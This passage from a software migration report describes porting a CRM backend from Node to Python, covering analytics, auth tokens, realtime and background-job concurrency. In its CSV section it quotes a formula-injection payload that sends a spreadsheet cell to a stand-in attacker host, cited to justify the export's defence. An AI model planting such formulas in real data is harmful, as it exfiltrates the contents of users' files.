| 7 | The audit write escaped the transaction - `create_audit_log` neither accepted nor passed `session` | A rolled-back user update would leave an audit row asserting it happened. The log is what people trust when working out what went wrong |
| 8 | `EmailStr` would have swapped zod's email rules for `email-validator`'s | A silently different set of acceptable addresses. zod v4's own regex is used instead, copied from `node_modules/zod/v4/core/regexes.cjs` |

Defect 6 was found by a test feeding `"$2b$04$tooshort"`. Defect 7 was found by the
transaction-participation test, which exists precisely because mongomock cannot prove atomicity.

### The transaction testing decision

`mongomock-motor` implements no sessions. Three options were weighed:

1. **Require a real replica set for the suite** - correct, and it makes checking out the repo
   and running tests depend on infrastructure. The Node suite has no such requirement; adding
   one here would be the first time this migration made the project harder to work on.
2. **Skip transactions in Python** - not an option, it is the behaviour being ported.
3. **Degrade gracefully and assert SESSION THREADING instead of atomicity** - implemented.

Nobody forgets `start_transaction`. People forget `session=` on the third write, and that write
then silently escapes the transaction. Option 3 tests exactly that, and it is what caught
defect 7.

**The limitation is explicit: the suite proves participation, not atomicity.** Atomicity is a
property of the replica set, verified in production by the readiness probe reporting
`replicaSet.ok: true, actual: rs0`.

### Users - the module that decides what every other route allows

**The three guards run in a fixed order and each masks the next if moved:**
missing -> 404, super_admin -> 403, self -> 400.

Checking self before super-admin lets a super admin disable themselves and lock the seed account
out of its own organisation. Checking existence last leaks whether an id belongs to a super
admin.

**Deliberate divergences preserved:**

- The route password minimum is **12**, not the policy's 8. `createUserBodySchema` spells
  `min(12)` and zod runs first, so `PASSWORD_TOO_SHORT` is unreachable through these routes.
  `PASSWORD_HAS_SURROUNDING_WHITESPACE` *is* reachable, because zod does not trim the field.
- **Unknown permissions are rejected at write time** even though `resolve_user_permissions`
  ignores them at read time. Ignoring at read is right for a stale record; accepting at write
  stores a typo the admin sees listed as though it works.
- `accountAccess` is forced empty when the mode is `all`, on create *and* update.
- Disable and reset-password revoke refresh sessions **in the same transaction**. Half of that
  pair leaves a departed employee working until their access token expires, with nothing in the
  UI showing it.

---


---

## Phase 5 — analytics: audited, foundation built

### It is portable now, and that was not obvious

`analytics.repository.ts` imports **models** (`Conversation`, `Message`, `Contact`,
`FollowUpTask`) — not services. Unlike media, notes and conversation-tags, it does **not**
import `loadVisibleConversationForActor`; the per-actor narrowing is implemented inside
analytics itself from permissions and `assignedTo`. So nothing blocks it on Phase 9.

Seven routes, all `GET`, all gated on `requireConversationsRead` — deliberately the same
permission as the inbox, because every number is a count of conversations the caller can
already open one at a time. A separate analytics permission would be a second thing to keep in
step with the narrowing, and the first time it drifted somebody would be reading counts of
chats they cannot see.

`/analytics/attention.csv` carries one extra obligation that lives in the service rather than
the route: a phone column **only** for a caller holding `CLIENT_PII_REVEAL`, and an audit row
when one is actually decrypted. `app/encryption.py` and `app/audit.py` already cover both.

### `app/date_range.py` — built and proven ✅

The hard part of analytics is not the aggregations, it is the boundaries. The business is in
**Asia/Kolkata**, where "today" starts at 18:30 UTC the previous day. A range computed by
subtracting milliseconds from `now` is five and a half hours out, and for a studio whose
enquiries arrive in the evening that puts a day's leads in the wrong bucket — with every total
still looking entirely plausible.

**The port is SIMPLER than the original, which is exactly why it needed proving.** Node has no
real timezone API, so `zonedTimeToUtc` guesses an instant, renders it back to local parts,
measures the drift and corrects — twice, to catch a DST transition between guess and target.
Python's `zoneinfo` gets there directly. Replacing an iterative algorithm with a library call is
the kind of simplification that quietly disagrees at the edges.

So it is not assumed to agree. `tests/fixtures/date_ranges.json` was generated by running the
real `date-range.ts`:

| | |
|---|---|
| Timezones | Asia/Kolkata, UTC, America/New_York, Australia/Sydney |
| Instants | Kolkata evening (already tomorrow locally), both US DST transition days, a Kolkata year boundary |
| Coverage | every preset, custom ranges, every error case |
| Tests | **219 passing**, boundaries and enumerated day lists compared against Node exactly |

### Defect 9: `tzdata` is a production dependency, not a Windows convenience

`ZoneInfo("Asia/Kolkata")` raises on any system without the IANA database — and
**`python:3.11-slim` has none**, same as Windows. Found because the suite failed locally.

Shipping without it would have been a hard failure on the first analytics request in production.
Pinned in `requirements.txt` with that reasoning, because the obvious reading of the diff is
"a Windows-only test fix" and someone would eventually remove it.

---


### Phase 5 foundations — all four built and proven against Node

| Module | Ports | Fixtures from | Tests |
|---|---|---|---|
| `app/date_range.py` | `date-range.ts` | real `resolveDateRange` across 4 timezones | 219 |
| `app/csv.py` | `csv.ts` | real `csvCell` / `toCsv` | 58 |
| `app/classification.py` | `conversation-classification.ts` | real classifier, 2,004 generated cases | 10,039 |
| `app/analytics_scope.py` | `resolveAnalyticsScope` | — (pure permission logic) | 11 |

Each was mutation-tested. Every mutation was caught.

#### `classification.py` — why 2,004 generated cases rather than hand-picked examples

`resolveAiResponseStatus` is a **six-rule precedence chain over ten nullable inputs**. The bugs
in a port of that are not in the rules, they are in the ORDER — and a hand-written suite tends
to contain the cases the author was already thinking about, which are the ones they got right.

The fixture walks the cross product with a prime stride and records what the real classifier
answered. All six statuses appear; `awaiting_ai_reply` is the rarest at 16 cases, which is
itself worth knowing — it needs confirmed + automation on + an inbound after the last reply.

**These names are shared with the inbox.** A metric card is clickable: it hands `enquiryClass`
and `aiStatus` to the conversation list, and the list hands them back. If a value meant one
thing here and another there, the number on the card and the length of the list it opens would
disagree, with no way to tell which was lying.

Two Python-specific traps are pinned by their own tests:

- **`aiAutomationEnabled is False`, not falsy.** A legacy row without the key must not read as
  paused — that would move every pre-field conversation into a bucket nothing drains.
- **Naive datetimes from the driver.** Mongo stores no zone, so comparing a naive to an aware
  datetime raises in Python where JavaScript just compares numbers. A `TypeError` on one legacy
  row would 500 the whole dashboard.

#### `csv.py` — the export is what creates the vulnerability

A customer chooses their own WhatsApp display name. The CRM renders it harmlessly everywhere
else; the export is what turns `=HYPERLINK("https://evil.test?x="&A1,"Click")` into a formula
that runs when the owner opens the file.

**Python's `csv` module is deliberately not used.** It handles RFC 4180 correctly and does
nothing about formula injection, and its quoting differs from Node's in exactly the places that
matter. Matching byte-for-byte is the requirement; a stdlib module that is 95% the same is worse
than 40 lines that are identical.

#### `analytics_scope.py` — the narrowing, restated a third time

`canReadAll` is module-private in `conversation.service.ts`, so analytics restates it, and
Python restates it again. Each restatement is a chance to forget it, and forgetting it means a
staff user's inbox shows their own threads while their dashboard totals the whole organisation —
with neither screen looking wrong.

An explicit `assignedTo=<someone else>` from a user without `read_all` is **refused, not quietly
rewritten**: answering a different question than the one asked would show them their own numbers
under another person's name.


### `classification_filters.py` — and a Node defect it uncovered

`classification-filters.ts` expresses the same rules as MongoDB predicates, because the inbox
pages server-side: "show me enquiries awaiting a reply" has to be answerable by the database,
and filtering the fifty rows already loaded would silently lie about everything past the first
page. Neither implementation can be built out of the other, so both exist.

The Node file carries this comment:

> *"whether MongoDB agrees with the TypeScript on real documents is the one thing only a
> database can answer, and that check is listed in the report as outstanding."*

**It is no longer outstanding.** `mongomock` turns out to evaluate `$expr`, `$ifNull`, `$cond`,
`$in` and `$max`, so the 2,004 generated conversations are inserted into an in-memory MongoDB,
every bucket filter is run against them, and the result is compared with what
`app/classification.py` says in process.

#### Result: the `aiStatus` buckets agreed perfectly. `needsAttention` did not.

28 of 2,004 disagreed, in both directions. **Both implementations were wrong, each on its own
terms, and both have been fixed in both services.**

| | Before | After |
|---|---|---|
| Agree | 1,976 | **2,004** |
| Query says yes, rules say no | 26 | 0 |
| Query says no, rules say yes | 2 | 0 |

---

## The Needs Attention decision

### What the list is supposed to mean

Taken from the UI's own published definition, which is the contract the owner actually reads
(`ConversationFilters.tsx`):

> *"A human should look at this: waiting on us, a failed send, or a follow-up that has come
> due."*

Three branches. Both bugs were a branch disagreeing with that sentence.

### Bug 1 — the in-process rule ignored human replies

`needsAttention` short-circuited on `status === AWAITING`. AWAITING compares the newest inbound
against the **AI-only** reply time, so a customer who messaged and was then answered **by a
human** still counted as waiting.

**The UI is the tiebreaker here.** It renders AWAITING as *"An enquiry whose newest inbound
message is newer than the last reply **sent**"* — not "the last AI reply". The rule contradicted
its own published definition.

**Fix:** drop the shortcut and rely on `hasUnansweredInbound`, which already compares against
`max(lastAiReplyAt, lastDeliveredOutboundAt)` — both sides of the business. A genuinely
unanswered AWAITING thread still matches; one a human answered no longer does.

**The AWAITING status itself is unchanged**, and deliberately so. It answers "has the AI
replied", which is a real and different question, and the inbox filter for it still works.

### Bug 2 — the query surfaced stale failures on threads a human owns

`needsAttentionFilter` had **no automation check** on its failure branch, so a paused thread
with an old AI send failure matched. `resolveAiResponseStatus` has always ranked PAUSED above
FAILED, so the in-process rules excluded exactly those rows.

All 26 cases were: automation **off**, an unresolved AI failure, and **nobody waiting** —
verified, not assumed. A human had taken the thread over and already answered.

**Fix:** add `AUTOMATION_ON` to that branch, so it means "an unresolved failure **on a thread
the AI still owns**".

### Rule 3 — failures must stay discoverable. They do, with no new workflow.

The inbox already has a dedicated filter: **"AI reply failed" — *"The most recent AI send
attempt failed and nothing has succeeded after it."*** It covers every thread the AI still owns.

For a paused thread, a stale AI failure is not actionable: a human owns it and the customer is
not waiting (the first branch would have caught it otherwise). The moment automation resumes,
the status flips back to `ai_reply_failed` and the filter surfaces it again. **No new
customer-facing state was introduced**, as instructed.

### The resulting rule, identical in all four places

```
needsAttention(c) =
    not (notEnquiry or optedOut)
    and ( hasUnansweredInbound(c)                 # waiting on us, either side counts
          or (automationOn(c) and unresolvedFailure(c))   # a failed send the AI still owns
          or followUpDue(c) )                     # a follow-up come due
```

One line per branch of the published definition.

### Files changed

| File | Change |
|---|---|
| `backend/src/modules/analytics/conversation-classification.ts` | dropped the AWAITING shortcut |
| `backend/src/modules/analytics/classification-filters.ts` | added the automation guard |
| `crm-api/app/classification.py` | same as Node |
| `crm-api/app/classification_filters.py` | same as Node |
| `backend/.../conversation-classification.test.ts` | +7 regression tests |
| `backend/.../classification-filters.test.ts` | +3 regression tests |
| `crm-api/tests/test_classification_filters.py` | rewritten to assert agreement |

**No API response shape changed and no UI change was needed.** The attention list is computed,
not stored; the counts it produces shift slightly and the definition it was always documented
against now holds.

### Verification

| Check | Result |
|---|---|
| Query vs. Python rules, 2,004 cases | identical |
| **Node fixture vs. Python rules**, 2,004 cases | identical — the third corner, so the two services cannot agree internally yet differ from each other |
| Six `aiStatus` buckets | unchanged, still partition exactly |
| Node suite | **3,214** passing (was 3,204) |
| Python suite | **10,722** passing |
| Mutation: restore the AWAITING shortcut | 3 Node + 5 Python failures |
| Mutation: drop the automation guard | caught in both |

**Not one of the 3,204 pre-existing Node tests failed when the behaviour changed** — the bug
lived in a region no test covered, which is why it survived to be found by a port.

### Production impact, for the deploy

The attention list will **shrink slightly**: conversations a human already answered, and paused
threads carrying a stale AI failure, drop off it. Nothing is hidden — the first group was
answered, and the second is reachable through the "AI reply failed" filter whenever the AI owns
the thread.

This ships with the Phase 5 Node change, so **Node and Python must deploy together or the two
services will disagree for the length of the window.** The analytics counts come from the query
and the row chips from the rules, so a split deploy shows a card whose number differs from the
list it opens — the exact symptom this fix removes.

#### A mongomock limitation, stated so nobody "fixes" the wrong thing

`mongomock` does **not** implement `{"$not": [expr]}`, MongoDB's documented aggregation array
form, and silently matches nothing — which made the `ai_replied` bucket return zero rows and the
partition sum 322 short. Real MongoDB handles it; Node emits it.

The test harness rewrites it to the equivalent scalar form **for the in-memory run only**, and
`test_THE_SHIPPED_FILTER_KEEPS_NODES_ARRAY_FORM` pins that the rewrite never reaches the filter
this service actually sends. Changing the shipped filter to suit the mock would have been a
silent divergence from Node.


### `analytics_pipelines.py` — 7 of the 14 repository builders, started

`analytics.repository.ts` is 1,320 lines and is almost entirely aggregation pipelines. The port
keeps Node's split exactly: **pure builders that return a pipeline, and four-line runners that
execute one.** That split is what makes this testable at all — a pipeline is a data structure,
so it can be compared stage-for-stage against the one Node produces without a database.

#### Done, each compared against a Node-generated fixture across 7 input shapes

| Builder | Covers |
|---|---|
| `build_conversation_match` | the `$match` under everything |
| `build_visible_conversation_match` | the lookup-side scope, window dropped |
| `build_reminder_visibility_match` / `build_reminder_conversation_match` | the reminder-side scoping quirks |
| `build_overview_pipeline` | the 12-branch `$facet` behind the cards |
| `build_conversation_trend_pipeline` | per-local-day conversation counts |
| `build_message_trend_pipeline` | per-local-day traffic, with the visibility `$lookup` |
| `build_ai_conversation_pipeline` | the conversation half of AI performance |
| `build_ai_message_pipeline` | AI sends bucketed by outcome |
| `build_first_response_pipeline` + `median_of` | measured response time, median sorted in the DB |

The seven input shapes are: unscoped, actor-narrowed, windowed, source+stage filtered,
classification filtered, attention filtered, and everything at once. **95 tests**, all passing;
5 mutations applied, all 5 caught.

#### Why structural comparison, rather than only running them

A mis-ported pipeline **does not raise**. A `$lookup` on the wrong field, a `$facet` branch that
collapsed, a `$match` whose `$and` became an assignment — each produces a dashboard that renders
perfectly and reports a number that is simply untrue. Nothing in the response reveals it, and
the comparison harness can only catch it if both services are live *and* the production data
happens to exercise the difference.

Comparing the pipeline itself catches all of it before anything is deployed.

#### Defect 10: `bool` is an `int` in Python

`read_facet_count` mirrors Node's `typeof value === 'number'`. In Python `isinstance(True, int)`
is **True**, so a `$facet` branch carrying `{"value": true}` would have read as the count **1**
where Node reads 0.

Caught by a test written specifically for the trap. A card reading "1 conversation" is far
harder to notice than one reading 0.

#### Four invariants now pinned that the comments called out but nothing enforced

- **Derived filters go into `$and`, never assigned onto the match.** Each can contribute its own
  `$expr`, and a second assignment silently discards the first — so "enquiries awaiting a reply"
  would have meant whichever was written last.
- **Both `$unwind`s in the first-response pipeline are exclusive.** Adding
  `preserveNullAndEmptyArrays` to either turns unanswered threads into rows with a null
  duration; `$avg` ignores nulls, so the average would look unchanged while the sample size
  silently inflated. The reader sees "averaged over 400" when 120 were never answered.
- **`$toInt` on both median indices.** `$divide` yields a double and `$arrayElemAt` refuses a
  non-integer index — but only on the *even*-sized branch, so an odd-sample test never sees it.
- **The `$group` runs before the `$lookup`** in both message pipelines. The shape is the
  performance: one lookup per thread per day instead of one per message.

#### Remaining in this file

`buildStageBreakdownPipeline` · `buildSourceBreakdownPipeline` · `buildOwnerBreakdownPipeline` ·
`buildFollowUpCountsPipeline` · `buildNextRemindersPipeline` · the attention list and its CSV
rows — then `analytics.service.ts` (881 lines) and the seven routes.

### What is NOT done, and why I stopped here

**The seven routes are not ported.** What remains is `analytics.repository.ts` — 1,320 lines of
MongoDB aggregation pipelines across conversations, messages, contacts and follow-up tasks.

Five of the six shared libraries beneath them are now done: `date_range`, `csv`,
`classification`, `classification_filters`, `analytics_scope`.

I stopped rather than half-porting them, deliberately. **Wrong analytics numbers look entirely
plausible.** A mis-ported `$facet` or a `$lookup` on the wrong field produces a dashboard that
renders perfectly and reports the wrong count, and there is nothing in the response for the
comparison harness or a reader to catch it except a line-by-line reading of both pipelines.
Shipping that half-done is worse than not shipping it.

The foundations above are the parts where a defect is *invisible* — a timezone boundary, a
precedence order, a formula guard — which is why they were worth doing first and proving
exhaustively.

---

## Phase 8 — background runners: full audit, and the ownership decision

**All 13 still run in Node. Not one has moved.** This is the only part of the migration where a
mistake sends a customer the same message twice.

### How they actually work

Every runner is `setInterval` + an enable flag, and the flag is read **once at construction**,
not per tick. `server-lifecycle.ts` constructs and `.start()`s each one at boot, with a
rollback step registered per runner. **There is no distributed lock anywhere**, because Node is
a single process and a single-process interval has always been sufficient.

That last fact is the whole problem: nothing in the current design prevents a second process
from running the same sweep.

### The 13, audited

| Runner | Enable flag | Interval flag | Customer-facing? |
|---|---|---|---|
| `delivery` | `WHATSAPP_OUTBOUND_DELIVERY_ENABLED` + `WHATSAPP_ENABLED` | `WHATSAPP_OUTBOUND_POLL_INTERVAL_MS` | **YES — sends WhatsApp** |
| `autoGreet` | `WHATSAPP_ENABLED` | `LEAD_AUTO_GREET_SWEEP_INTERVAL_MS` | **YES — first message to a new lead** |
| `nurture` | `NURTURE_ENABLED` | `NURTURE_SWEEP_INTERVAL_MS` | **YES — follow-up chases** |
| `promiseFollowUp` | `PROMISE_FOLLOW_UP_ENABLED` | — | **YES** |
| `eventReminder` | `EVENT_REMINDERS_ENABLED` | `EVENT_REMINDER_SWEEP_INTERVAL_MS` | **YES** |
| `paymentFollowUp` | `DAILY_JOBS_ENABLED` | daily at `DIGEST_HOUR` | **YES** |
| `morningRead` | `DAILY_JOBS_ENABLED` | daily at `DIGEST_HOUR` | YES (owner) |
| `digest` | `DAILY_JOBS_ENABLED` | daily at `DIGEST_HOUR` | YES (owner) |
| `bookingCountdown` | `DAILY_JOBS_ENABLED` | daily at `DIGEST_HOUR` | YES (owner) |
| `ownerCallEscalation` | `OWNER_CALL_ESCALATION_ENABLED` | `OWNER_CALL_ESCALATION_SWEEP_INTERVAL_MS` | **YES — places a Vapi phone call** |
| `reminder` | `REMINDERS_ENABLED` | `REMINDER_SWEEP_INTERVAL_MS` | YES (push + Clock alarms) |
| `leadImport` | `LEAD_IMPORT_ENABLED` | `LEAD_IMPORT_POLL_INTERVAL_MS` | no — ingests from Meta |
| `realtimeOutbox` | — (always on) | `REALTIME_OUTBOX_POLL_INTERVAL_MS` | no — fans out to SSE |

**Three share one flag.** `morningRead`, `digest`, `bookingCountdown` and `paymentFollowUp` all
hang off `DAILY_JOBS_ENABLED`, so they cannot be migrated independently of one another by
flag alone. They move as a unit or they need a new flag each.

**`realtimeOutbox` has no enable flag at all** — it starts unconditionally. It is also the one
that must move with `/realtime`, since both ends of the SSE fan-out have to be in the same
service.

### The decision: staged handover on the existing flags, with a Redis lease as a backstop

Three mechanisms were considered.

| Option | Verdict |
|---|---|
| **A. Redis lease per runner**, acquired each tick | Robust against deploy ordering and double-starts — but requires editing all 13 **Node** runners to acquire it. That is new code in the service this migration exists to shrink, touching the paths that send customer messages, for a benefit only realised during cutover |
| **B. Delete the Node runner in the commit that adds the Python one** | Safest against double-execution, worst for rollback — and rollback is the property this migration has protected at every single step |
| **C. Staged handover on the flags that already exist** | **Chosen.** Disable in Node → restart → *verify stopped* → enable in Python → restart |

**Why C.** The flags already exist and are already read at construction, so no Node code
changes at all. The window between the two restarts has **zero** runners active, which is
harmless: every one of these is a sweep that re-reads state each tick, so a missed tick is a
delay of one interval, never a lost action. The failure mode C protects against — both services
sweeping at once — is the only one that sends a customer two messages.

Option A's per-tick lease is strictly better *in steady state*, and it is still the right thing
**inside Python** to stop two Python replicas double-running. So:

> **Node side: flags only, no code change. Python side: flag AND a Redis lease.**

The lease is defence-in-depth against a future second Python instance, not the handover
mechanism.

### Cutover procedure, per runner

1. Set the runner's flag false in `backend/.env`
2. Restart the Node service
3. **Verify it stopped** — the runner logs a start line at boot; confirm its absence, and
   confirm the sweep's side-effect has ceased
4. Set the flag true for `crm-api`
5. Restart `crm-api`
6. Verify the Python runner took the lease and is sweeping

**Rollback** is steps 4→1 in reverse, and Node's runner is unchanged throughout, so it starts
again exactly as before.

### Ordering

Lowest-risk first, so the mechanism is proven before it is trusted with a customer message:

1. `realtimeOutbox` — no customer contact, and it must move with `/realtime` anyway
2. `leadImport` — ingest only; worst case is a delayed import
3. `reminder` — push and Clock alarms, no WhatsApp
4. the four `DAILY_JOBS_ENABLED` jobs, **as one unit**
5. `eventReminder`, `promiseFollowUp`, `nurture`
6. `autoGreet`, `delivery` — last, because they are the ones that message a lead
7. `ownerCallEscalation` — last of all; it places a real phone call

**Not one of these can move before its module does.** `delivery` needs the WhatsApp send path
(Phase 11); `autoGreet` and `nurture` need ai-brain (Phase 10); `leadImport` needs lead-sources
(Phase 9). The runner audit is therefore complete, but the migrations are gated on their
modules — which is why Phase 8 sits where it does in the roadmap rather than earlier.

---


---

## ⚠️ PRE-CUTOVER REQUIREMENT — Phase 5 response comparison

**Not a blocker on further development. It IS a blocker on moving the Caddy routes.**

Before `/api/v1/analytics*` is pointed at Python, run `tools/compare_responses.py` against both
services for all seven routes, while Node still owns them. That window is the only time the Node
reference exists.

Minimum set, each with and without `?assignedTo=<a real user>`:

```
/api/v1/analytics/overview
/api/v1/analytics/overview?preset=last_7_days
/api/v1/analytics/overview?enquiryClass=enquiry&aiStatus=awaiting_ai_reply
/api/v1/analytics/trends?preset=last_7_days
/api/v1/analytics/ai-performance
/api/v1/analytics/breakdowns
/api/v1/analytics/reminders?limit=5
/api/v1/analytics/attention?limit=25
/api/v1/analytics/attention.csv?limit=10
```

`attention.csv` is not JSON, so the harness compares status and headers only — check
`X-Total-Count`, `X-Row-Count` and the header row by eye.

**Also outstanding for Phase 5:** 24 route tests skip under `mongomock`, which implements
neither `$lookup` with `pipeline` nor with `let`. They are written to run unchanged against a
real MongoDB; the pipelines themselves are already compared to Node structurally.

---

## Phase 6 — auth routes ✅ implemented

### The phase that changes the trust model

Up to here Node was the only signer and Python only verified, so a format disagreement could
only break Python. **From Phase 6 both services mint access tokens against the same secret**: a
session created by Python's `/auth/login` is read by `auth.middleware.ts` on the very next
Node-served request.

A disagreement is not subtle. It is every user logged out, with a correct password, and a 401
that reads as the user's mistake.

| File | Ports |
|---|---|
| `app/tokens.py` | `token.service.ts` — signing, refresh-token generation and hashing |
| `app/auth_cookies.py` | `auth-cookie.service.ts` |
| `app/login_rate_limit.py` | `login-rate-limit.service.ts` |
| `app/routers/auth.py` | the six routes |

**Tests: 35 token + 38 route = 73.** Both mutation-tested; all 10 mutations caught.

### Proven against Node, not against itself

`tools/make_token_fixtures.mjs` signs tokens with `jsonwebtoken` — the library Node actually
uses — and emits the SHA-256 refresh hashes Node stores. The Python suite verifies them and
compares its own claim set and header against Node's, including the `alg: none` attack and a
refresh token signed with the same secret (the `type` claim is the only thing separating them,
which is why it is checked **after** the signature, never before).

### Three behaviours worth recording

**Every login failure answers identically.** Unknown organisation, unknown user and wrong
password are all 401 `INVALID_CREDENTIALS` with the same message, and all three pay the cost of
a bcrypt verification — against a decoy hash when there is no real one. Skipping the hash for an
unknown account returns far faster and lets an attacker enumerate valid emails by response time
while every response says the same thing. Status checks (`ORGANIZATION_NOT_ACTIVE`,
`USER_NOT_ACTIVE`) come **after** the password check, so the status is never a way to probe.

**Refresh-token reuse is treated as a breach.** A rotated token presented twice revokes the
**entire family**, not just that session. Revoking only the presented one would leave a thief's
newer token working.

**Change-password keeps the current session and kills the others.** A password change is how a
user responds to a suspected compromise; the point is to evict whoever else is signed in, not to
log the user out of the act of securing their own account.

### One knowing difference

Node computes the refresh expiry with `setDate(getDate() + ttl)` — **calendar**-day arithmetic
in the server's local zone, which across a DST boundary is not always 24 hours. Python uses
`timedelta(days=n)`, an exact interval. The server runs UTC, where the two are identical, and an
exact interval is the more defensible of the two for a token lifetime. Recorded rather than left
to be discovered.

---


---

## Phase 7 — push and realtime ✅, calls re-scoped

### `loadVisibleConversationForActor` is the gravity well of this codebase

Four modules have now been pushed to Phase 9 by the same single import:

| Module | Route | Why |
|---|---|---|
| notes | `/conversations/:id/notes` | nested under conversations |
| tags (attach/detach) | `/conversations/:id/tags` | nested, plus a transaction |
| media | `/messages/:id/media` | `media.controller.ts:26` |
| **calls** | **`/api/v1/calls`** | **both routes call it** |

`calls` is the notable one because it is **not** nested — it is mounted flat at `/api/v1/calls`,
so the route map says it is independent. It is not: `getCallForActor` and
`recordCallOutcomeForActor` both call `loadVisibleConversationForActor` before returning
anything, and that is the right design (a call is a thing that happened on a lead, so seeing one
is seeing the lead). It simply cannot move before conversations do.

The calls module also exports **three** routers — `conversationCallRouter`,
`conversationCallOutcomeRouter` and the flat `callRouter` — so even without the service
dependency only one third of it was ever a Phase 7 candidate.

### `/push` — registration only, and that boundary is deliberate

Three routes: register a device, remove one, report configuration. **None of them sends a
notification.** The FCM delivery path (`push-notify.service.ts`) is only ever called by the
reminder runner, so it moves in Phase 8 with that runner — this service does not acquire a
second code path that could emit a customer-facing push while Node still owns the sweep.

The security property is ownership, not permission: **the owner of a device is the session,
never the body.** The schema has no `userId` or `organizationId` fields at all, so a signed-in
user cannot point another organisation's reminders at their own handset. Removal is scoped to
the caller's own organisation *and* user, so knowing somebody else's token is not enough to
silence their phone — and it answers 200 either way, because a 404 would turn the endpoint into
an oracle for whether a token exists.

Registration upserts **on the token alone**. A handset handed to a colleague must MOVE rather
than duplicate, or the previous owner keeps receiving the new owner's reminders on a phone they
no longer have.

`/push/status` reports names of missing variables only — never values, never the private key.
`enabled` and `configured` stay separate facts: off deliberately, and on-but-misconfigured, are
different problems with different fixes.

**20 tests, 5 mutations, all caught.**

### `/realtime` — it can move WITHOUT its runner, and that was not the obvious answer

The obvious reading is that the hub holds connections in memory, so a client on Python would
never see an event Node published, and the stream and `realtime-outbox.runner.ts` would have to
cut over atomically.

**That reading is wrong.** `realtime.publisher.ts` publishes to a Redis channel
(`realtime:events`) and `realtime.hub.ts` subscribes to it. Both services subscribe to the same
channel against the same Redis, so:

- `/realtime/stream` can move now while the runner stays in Node until Phase 8.
- During the transition **both** hubs hold clients and both receive every event. There is no
  window where a connected browser stops updating.
- **This is not a duplicate-execution risk.** The runner is the only thing that *publishes*;
  hubs only deliver, and a browser connects to exactly one of them. Two deliverers is fan-out,
  not double-sending.

**The permission filter is the security boundary.** Events carry no message content, but "this
conversation just changed" is still a fact about a lead. Organisation first, always; then
account events to the whole organisation (they carry no conversation); then `read_all` sees
everything; then assignment. **A null assignee is not "assigned to you"** — treating it as a
match would stream every unassigned lead's activity to every restricted client.

**26 tests, 5 mutations, all caught.**

#### One deliberate structural difference

Node keeps a single Redis subscriber and a `Set` of response objects, because Express hands it a
raw socket to write to. FastAPI's `StreamingResponse` is pull-based, so each connection owns an
async generator and **subscribes individually**. That is more Redis connections — bounded by the
number of open dashboards, a handful. A shared subscriber fanning into per-client queues is a
second piece of concurrency to get right for no benefit at this scale, and getting it wrong
produces a client that silently stops receiving.

---


---

## Phase 8 — the runner audit was wrong, and the real picture is much better

### Every runner already claims its work atomically. The claim IS the mutual exclusion.

The earlier audit recorded "no distributed lock anywhere" and designed a staged flag handover
around it. That was right about the *lock* and wrong about the *risk*. Reading the services
rather than the runners shows every unit of work is claimed in MongoDB before it is acted on:

| Runner | Claim |
|---|---|
| `delivery` | `claimNextOutboundMessage` — *"claimed atomically (status → sending) before sending so overlapping ticks"* |
| `realtimeOutbox` | `claimNextRealtimeOutboxEvent` |
| `autoGreet` | `claimAutoGreet` |
| `nurture` | claims + `idempotencyKey` |
| `eventReminder` | `claimEventReminder`, `claimNewLeadAlert` |
| `paymentFollowUp` | `claimPaymentChase`, `claimPaymentPrompt` |
| `promiseFollowUp` | `claimPromisedFollowUp` |
| `reminder` | `claimDueReminder` |
| `ownerCallEscalation` | `claimOwnerCallEscalation` |

**A `findOneAndUpdate` that flips a row's status is a mutual exclusion that works across
processes, services and machines.** Two runners sweeping the same collection do not double-send:
the first claims the row, the second finds nothing. This is the same mechanism Phase 7 relied on
for the realtime fan-out, and it means **nine of the thirteen runners can simply run in both
services during a transition** with no flag, no lease and no atomic cutover.

That is a far better position than the staged handover the earlier audit designed, and the
earlier design is withdrawn.

### The exception: the four daily jobs

`digest`, `morningRead`, `bookingCountdown` and `paymentFollowUp` hang off
`createDailyScheduler`, which guards re-firing with:

```ts
let lastFiredDateKey: string | null = null;
```

**An in-process variable, persisted nowhere.** `digest.service.ts` and
`booking-countdown.service.ts` then call `notifyOwner` directly — one message per day, no
claimable rows, no idempotency key. So two schedulers means two digests.

### Defect 11 — live in production today, and not caused by the migration

The same variable means the guarantee lasts exactly as long as the process. **Restart the Node
backend any time after `DIGEST_HOUR` and every daily job fires again**: `lastFiredDateKey` is
null while `hasReachedLocalTime` is still true. The owner receives a second digest, a second
morning read and a second booking countdown, the same evening. Nothing in the data prevents it.

This is not a migration risk. It is a bug the migration found by asking a question nobody had
needed to ask before.

### The fix: claim the DAY, in the database, exactly as the other nine claim their rows

`app/daily_jobs.py` — `claim_daily_run(organization_id, job, date_key, instance)`. The insert is
the claim; a unique index on `(organizationId, job, dateKey)` makes the second one fail,
whichever process or service makes it.

**Claimed before the run, not after**, matching the comment already in `daily-scheduler.ts`: a
job that throws, or one that outlives the next tick, must not be retried for the rest of the
day — a customer-facing message that went out and then failed to record itself would otherwise
be sent again.

**The date key is a LOCAL calendar day.** The business runs on Asia/Kolkata, so an 18:00 local
job fires at 12:30 UTC and a UTC-keyed marker would roll over mid-evening.

`ensure_indexes()` creates the unique index from the application rather than leaving it to a
migration, because the guarantee is worthless if it is missing and a service that creates its
own safety index cannot be deployed without it.

**16 tests**, covering restart survival, two services, per-job and per-organisation
independence, and the index itself.

### Revised Phase 8 plan

| Runner group | Transition strategy |
|---|---|
| The nine claim-based runners | **Run in both services.** No flag, no lease. The claim serialises them |
| The four daily jobs | **Must adopt `claim_daily_run` in BOTH services before either schedules them.** Until then they stay Node-only |
| `leadImport` | Needs its own read — no claim found in `lead-import.service.ts`; the dedupe may live in `meta-lead-import.service.ts` or in the import ledger |

**Outstanding Node change:** `digest`, `morningRead` and `bookingCountdown` need to call a
shared daily claim before acting. That is a small, reviewable change to three services and it
fixes the production restart bug whether or not Python ever schedules them. **Not yet applied** —
it is the next task.

---


---

## Phase 8 — concurrency audit COMPLETE, infrastructure built

### All 13 runners are concurrency-safe. None needs a lease.

The audit is finished and the answer is better than the plan it replaces:

| Mechanism | Runners |
|---|---|
| `findOneAndUpdate` flipping a row's status | delivery, realtimeOutbox, autoGreet, nurture, eventReminder, paymentFollowUp, promiseFollowUp, reminder, ownerCallEscalation |
| unique index on the lead-submission ledger | **leadImport** — *"the submission ledger's unique index is the duplicate check"* (`lead-pipeline.service.ts`) |
| unique index on `(organizationId, job, dateKey)` | the four daily jobs — **added in Phase 8** |

**A claim that flips a row is a mutual exclusion across processes, services and machines.** Two
sweeps running at once do not double-send: the first claims the row, the second finds nothing.
A distributed lease would add a second, weaker guarantee on top of a working one — and a lease
can expire mid-sweep, which a claim cannot.

**The earlier staged-flag handover design is withdrawn.** It solved a problem the codebase had
